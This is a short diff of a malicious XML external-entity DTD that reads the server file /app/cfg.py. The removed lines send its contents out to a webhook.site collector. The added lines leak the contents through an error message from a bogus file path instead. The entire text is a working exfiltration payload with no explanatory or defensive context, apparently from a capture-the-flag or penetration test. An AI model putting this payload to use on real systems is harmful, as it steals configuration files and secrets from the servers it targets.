@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///app/cfg.py">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://webhook.site/YOUR-ID?data=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
 %eval;
-%exfil;
+%error;
